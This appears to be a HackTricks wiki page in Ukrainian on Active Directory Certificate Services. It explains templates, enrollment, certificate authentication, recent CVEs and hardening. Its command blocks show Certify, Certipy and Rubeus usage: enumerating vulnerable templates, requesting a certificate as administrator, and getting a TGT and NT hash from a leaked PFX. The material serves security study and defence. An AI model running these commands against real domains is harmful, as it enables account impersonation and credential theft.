# Сертифікати AD

{{#include ../../banners/hacktricks-training.md}}

## Вступ

### Компоненти сертифіката

- **Subject** сертифіката вказує на його власника.
- **Public Key** пов’язаний із приватним ключем, що перебуває у власника, і дає змогу пов’язати сертифікат із його законним власником.
- **Validity Period**, визначений датами **NotBefore** і **NotAfter**, позначає період чинності сертифіката.
- Унікальний **Serial Number**, наданий центром сертифікації (CA), ідентифікує кожен сертифікат.
- **Issuer** — це CA, який видав сертифікат.
- **SubjectAlternativeName** дає змогу вказати додаткові імена суб’єкта, підвищуючи гнучкість ідентифікації.
- **Basic Constraints** визначають, чи призначений сертифікат для CA або кінцевого суб’єкта, а також встановлюють обмеження щодо його використання.
- **Extended Key Usages (EKUs)** визначають призначення сертифіката, наприклад підписування коду або шифрування електронної пошти, за допомогою ідентифікаторів об’єктів (OIDs).
- **Signature Algorithm** визначає метод підписання сертифіката.
- **Signature**, створений за допомогою приватного ключа видавця, гарантує автентичність сертифіката.<sup>[[4]](#references)</sup>

### Особливі зауваження

- **Subject Alternative Names (SANs)** розширюють застосування сертифіката на кілька ідентичностей, що особливо важливо для серверів із кількома доменами. Безпечні процеси видачі мають вирішальне значення, щоб уникнути ризику імперсонації з боку зловмисників, які маніпулюють параметром SAN.<sup>[[4]](#references)</sup>

### Центри сертифікації (CAs) в Active Directory (AD)

AD CS розпізнає сертифікати CA в лісі AD через призначені для цього контейнери, кожен із яких виконує окрему роль:<sup>[[4]](#references)</sup>

- Контейнер **Certification Authorities** містить довірені сертифікати кореневих CA.
- Контейнер **Enrolment Services** містить відомості про Enterprise CAs та їхні шаблони сертифікатів.
- Об’єкт **NTAuthCertificates** містить сертифікати CA, яким дозволено автентифікацію в AD.
- Контейнер **AIA (Authority Information Access)** забезпечує перевірку ланцюжка сертифікатів за допомогою проміжних сертифікатів і сертифікатів перехресної сертифікації CA.

### Отримання сертифіката: процес запиту сертифіката клієнтом

1. Процес запиту починається з пошуку клієнтами Enterprise CA.
2. Після створення пари відкритого та приватного ключів формується CSR, що містить відкритий ключ та інші дані.
3. CA перевіряє CSR на відповідність доступним шаблонам сертифікатів і видає сертифікат згідно з дозволами шаблону.
4. Після схвалення CA підписує сертифікат своїм приватним ключем і повертає його клієнту.<sup>[[4]](#references)</sup>

### Шаблони сертифікатів

Ці шаблони, визначені в AD, задають параметри та дозволи для видачі сертифікатів, зокрема дозволені EKUs і права на реєстрацію або зміну. Вони мають вирішальне значення для керування доступом до служб сертифікатів.<sup>[[4]](#references)</sup>

**Версія схеми шаблону має значення.** У застарілих шаблонах **v1** (наприклад, вбудованому шаблоні **WebServer**) бракує кількох сучасних механізмів примусового застосування політик. Дослідження **ESC15/EKUwu** показало, що в шаблонах **v1** запитувач може вказати **Application Policies/EKUs** у CSR, і вони матимуть **вищий пріоритет за** налаштовані в шаблоні EKUs. Це дає змогу отримувати сертифікати для автентифікації клієнта, агента реєстрації або підписування коду, маючи лише права на реєстрацію. Надавайте перевагу шаблонам **v2/v3**, вилучайте або замінюйте типові шаблони v1 і суворо обмежуйте EKUs їхнім призначенням.<sup>[[1]](#references)</sup>

## Реєстрація сертифіката

Процес реєстрації сертифікатів починається з того, що адміністратор **створює шаблон сертифіката**, який потім **публікує** Enterprise Certificate Authority (CA). Завдяки цьому шаблон стає доступним для реєстрації клієнтами. Для цього ім’я шаблону додають до поля `certificatetemplates` об’єкта Active Directory.<sup>[[4]](#references)</sup>

Щоб клієнт міг запросити сертифікат, йому потрібно надати **права на реєстрацію**. Ці права визначаються дескрипторами безпеки шаблону сертифіката та самого Enterprise CA. Щоб запит було успішно виконано, дозволи потрібно надати в обох місцях.<sup>[[4]](#references)</sup>

### Права на реєстрацію шаблону

Ці права задаються через записи керування доступом (ACEs), які визначають такі дозволи:<sup>[[4]](#references)</sup>

- Права **Certificate-Enrollment** і **Certificate-AutoEnrollment**, кожне з яких пов’язане з певними GUID.
- **ExtendedRights**, що надають усі розширені дозволи.
- **FullControl/GenericAll**, що забезпечують повний контроль над шаблоном.

### Права на реєстрацію в Enterprise CA

Права CA визначаються в його дескрипторі безпеки, який можна переглянути в консолі керування Certificate Authority. Деякі параметри навіть дозволяють користувачам із низькими привілеями віддалений доступ, що може становити загрозу безпеці.<sup>[[4]](#references)</sup>

### Додаткові засоби контролю видачі

Можуть застосовуватися певні засоби контролю, зокрема:<sup>[[4]](#references)</sup>

- **Manager Approval**: переводить запити в стан очікування до їх схвалення менеджером сертифікатів.
- **Enrolment Agents and Authorized Signatures**: визначають кількість підписів, потрібних у CSR, і необхідні OIDs політик застосунків.

### Способи запиту сертифікатів

Сертифікати можна запитувати через:<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), використовуючи інтерфейси DCOM.
2. **ICertPassage Remote Protocol** (MS-ICPR), через іменовані канали або TCP/IP.
3. **Вебінтерфейс реєстрації сертифікатів**, якщо встановлено роль Certificate Authority Web Enrollment.
4. **Certificate Enrollment Service** (CES) у поєднанні зі службою Certificate Enrollment Policy (CEP).
5. **Network Device Enrollment Service** (NDES) для мережевих пристроїв, використовуючи Simple Certificate Enrollment Protocol (SCEP).

Користувачі Windows також можуть запитувати сертифікати через GUI (`certmgr.msc` або `certlm.msc`) чи інструменти командного рядка (`certreq.exe` або команду PowerShell `Get-Certificate`).

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Автентифікація за сертифікатом

Active Directory (AD) підтримує автентифікацію за сертифікатом, переважно використовуючи протоколи **Kerberos** і **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Процес автентифікації Kerberos

Під час процесу автентифікації Kerberos запит користувача на отримання Ticket Granting Ticket (TGT) підписується **приватним ключем** сертифіката користувача. Контролер домену виконує кілька перевірок цього запиту, зокрема перевіряє **дійсність**, **ланцюжок** і **статус відкликання** сертифіката. Перевірки також охоплюють підтвердження того, що сертифікат походить із довіреного джерела, і наявності видавця в **сховищі сертифікатів NTAUTH**. У разі успішного проходження перевірок видається TGT. Об’єкт **`NTAuthCertificates`** в AD розташований за адресою:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

є ключовим для встановлення довіри під час автентифікації за сертифікатом.<sup>[[4]](#references)</sup>

Після розгортання **KB5014754** сучасна автентифікація Kerberos за сертифікатами здебільшого залежить від **сили зіставлення**, а не лише від EKU.<sup>[[2]](#references)</sup> У захищених лісах:

- Сертифіката, що містить лише **UPN/DNS SAN**, може бути вже недостатньо для входу.
- KDC надає перевагу **сильному зв’язуванню**, зазвичай за допомогою **розширення безпеки SID** (`1.3.6.1.4.1.311.25.2`) або сильного явного зіставлення в `altSecurityIdentities`.
- Якщо в сертифікаті немає сильного зіставлення, контролери домену реєструють **Kdcsvc Event ID 39/41** у режимі сумісності та відхиляють автентифікацію в режимі примусового застосування.
- У змішаних шляхах атаки важливі **ESC9/ESC16**, оскільки вони видаляють розширення SID із виданих сертифікатів; тоді оператори покладаються на явні зіставлення або формати SID у SAN URL, якщо це підтримує шлях атаки.

### Автентифікація Secure Channel (Schannel)

Schannel забезпечує захищені TLS/SSL-з’єднання: під час рукостискання клієнт надає сертифікат, який у разі успішної перевірки надає доступ.<sup>[[5]](#references)</sup> Зіставлення сертифіката з обліковим записом AD може здійснюватися, зокрема, за допомогою функції **S4U2Self** у Kerberos або поля **Subject Alternative Name (SAN)** сертифіката.<sup>[[4]](#references)</sup>

Schannel також є практичним запасним варіантом, коли **PKINIT** недоступний. Наприклад, якщо контролер домену не має відповідного сертифіката **Smart Card Logon**, інструменти `certipy auth`/PKINIT можуть не отримати TGT, але той самий сертифікат усе ще можна використати для автентифікації та операцій LDAP через **LDAPS** або **LDAP StartTLS**.

### Перерахування AD Certificate Services

Служби сертифікатів AD можна перерахувати за допомогою LDAP-запитів, щоб отримати інформацію про **Enterprise Certificate Authorities (CA)** та їхні конфігурації. Це доступно будь-якому автентифікованому користувачеві домену без спеціальних привілеїв.<sup>[[4]](#references)</sup> Для перерахування та оцінювання вразливостей у середовищах AD CS використовують такі інструменти, як **[Certify](https://github.com/GhostPack/Certify)** і **[Certipy](https://github.com/ly4k/Certipy)**.<sup>[[6]](#references)</sup>

Приклади команд для використання цих інструментів:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Прапорці переліку Certify та PKINIT за допомогою Rubeus

Наведені варіанти команд Certify зберігають свої окремі фільтри та параметри виводу.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus також може використовувати захищений паролем сертифікат PFX для автентифікації PKINIT і запитувати TGT. Необов’язковий параметр `/getcredentials` запитує службовий квиток U2U та намагається відновити NT-хеш облікового запису:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

For ESC-specific template and CA abuse, див. [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Нещодавні вразливості та оновлення безпеки (2022–2025)

| Рік | ID / Назва | Вплив | Основні висновки |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | *Підвищення привілеїв* через підміну сертифікатів облікових записів комп’ютерів під час PKINIT. | Виправлення входить до оновлень безпеки від **10 травня 2022 року**. Засоби аудиту та контролю надійного зіставлення запроваджено через **KB5014754**; тепер середовища мають працювати в режимі *Full Enforcement*. |
| 2023 | **CVE-2023-35350 / 35351** | *Віддалене виконання коду* в ролях AD CS Web Enrollment (certsrv) і CES. | Загальнодоступних PoC небагато, але вразливі компоненти IIS часто доступні у внутрішній мережі. Виправлення випущено в межах Patch Tuesday за **липень 2023 року**. |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | У **шаблонах v1** запитувач із правами на реєстрацію може вбудувати в CSR **Application Policies/EKUs**, які мають пріоритет над EKU шаблону. У результаті створюються сертифікати для автентифікації клієнта, агента реєстрації або підписування коду. | Виправлення випущено **12 листопада 2024 року**. Замініть шаблони v1 або створіть шаблони, що їх замінюють (наприклад, стандартний WebServer), обмежте EKU відповідно до призначення та обмежте права на реєстрацію. |

### Хронологія посилення захисту Microsoft (KB5014754)

Microsoft запровадила поетапне розгортання у три етапи (Compatibility → Audit → Enforcement), щоб перейти від слабких неявних зіставлень у Kerberos-аутентифікації за сертифікатами. Станом на **11 лютого 2025 року** контролери домену автоматично переходять у режим **Full Enforcement**, якщо значення реєстру `StrongCertificateBindingEnforcement` не задано. Пізніше Microsoft оновила графік, дозволивши повернення до режиму сумісності до оновлення безпеки від **9 вересня 2025 року**.<sup>[[2]](#references)</sup> Адміністраторам слід:

1. Встановити оновлення на всі DC і сервери AD CS (за травень 2022 року або новіші).
2. Відстежувати Event ID 39/41 на наявність слабких зіставлень під час етапу *Audit*.
3. Повторно видати сертифікати автентифікації клієнтів із новим **SID extension** або налаштувати надійні ручні зіставлення до того, як етап примусового застосування заблокує слабкі зіставлення.

### Примітки для операторів у середовищах із посиленим захистом

- **ESC1/ESC6 — це вже не вся картина** в середовищах 2025 року й новіших. Якщо ви запитуєте сертифікат для іншого суб’єкта, зазвичай потрібен також артефакт надійного зіставлення, наприклад SID extension або явне зіставлення.
- **ESC15 (EKUwu)** найбільш корисна переважно в середовищах без виправлень, оскільки перетворює нешкідливі шаблони **v1**, як-от **WebServer**, на сертифікати, придатні для автентифікації або використання агентом реєстрації, шляхом впровадження **Application Policies**. Kerberos PKINIT і далі перевіряє EKU, але **LDAP Schannel** також враховує Application Policies, тому зловживання на основі LDAP залишається актуальним.<sup>[[1]](#references)</sup>
- **ESC16** — це параметр на рівні CA: якщо CA глобально вимикає розширення безпеки SID, усі видані сертифікати переходять до слабшої поведінки зіставлення, якщо тільки ланцюжок атаки не впроваджує SID в іншому підтримуваному форматі.
- **Права ESC7 мають різне призначення:** право `ManageCA` на CA може дозволити змінювати параметри, як-от `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), тоді як `ManageCertificates` керує затвердженням запитів. Явна заборона прав менеджера сертифікатів може заблокувати цей шлях затвердження, навіть якщо також задано дозвіл; перед поєднанням параметрів і шаблонів оцініть ефективний ACL CA. Див. [оцінювання ACL CA від Microsoft](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Покращення виявлення та посилення захисту

* **Сенсор Defender for Identity для AD CS (2023–2024)** тепер показує оцінювання стану захисту для ESC1–ESC8/ESC11 і генерує сповіщення в реальному часі, як-от *«Видача сертифіката контролера домену для не-DC»* (ESC8) і *«Запобігання реєстрації сертифікатів із довільними Application Policies»* (ESC15). Щоб скористатися цими засобами виявлення, розгорніть сенсори на всіх серверах AD CS.<sup>[[3]](#references)</sup>
* Вимкніть параметр **“Supply in the request”** у всіх шаблонах або суворо обмежте його використання; надавайте перевагу явно визначеним значенням SAN/EKU.
* Видаліть **Any Purpose** або **No EKU** із шаблонів, якщо вони не є абсолютно необхідними (це усуває сценарії ESC2).
* Для чутливих шаблонів (наприклад, WebServer / CodeSigning) вимагайте **затвердження менеджером** або використовуйте окремі робочі процеси Enrollment Agent.
* Обмежте доступ до вебреєстрації (`certsrv`) і кінцевих точок CES/NDES довіреними мережами або захистіть їх автентифікацією за сертифікатом клієнта.
* Увімкніть шифрування реєстрації RPC (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`), щоб зменшити ризик ESC11 (RPC relay). Прапорець **увімкнено за замовчуванням**, але його часто вимикають для застарілих клієнтів, що знову відкриває ризик relay-атак.
* Захистіть **кінцеві точки реєстрації на основі IIS** (CES/Certsrv): за можливості вимкніть NTLM або вимагайте HTTPS + Extended Protection, щоб блокувати ESC8 relay-атаки.

Оцінюйте ESC11 на хості, де запущено CA; це може бути сервер-член домену, а не контролер домену. Перевірте активний `InterfaceFlags` CA у `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`; якщо значення недоступне для читання або відсутнє, результат невідомий — це не доводить, що шифрування RPC вимкнено. Відсутній біт `IF_ENFORCEENCRYPTICERTREQUEST` вказує на конфігурацію, яку варто перевірити, але для атаки також потрібні доступна кінцева точка реєстрації RPC, облікові дані, які можна примусово автентифікувати, і придатний шаблон сертифіката. Для ESC8 самого лише HTTP NTLM challenge недостатньо: переконайтеся, що доступна робоча кінцева точка реєстрації.

---

## References

- [1] [EKUwu: не просто чергова ESC в AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: зміни автентифікації на основі сертифікатів на контролерах домену Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Оцінювання стану безпеки сертифікатів — Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: зловживання Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Що таке автентифікація клієнта SSL/TLS і як вона працює?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
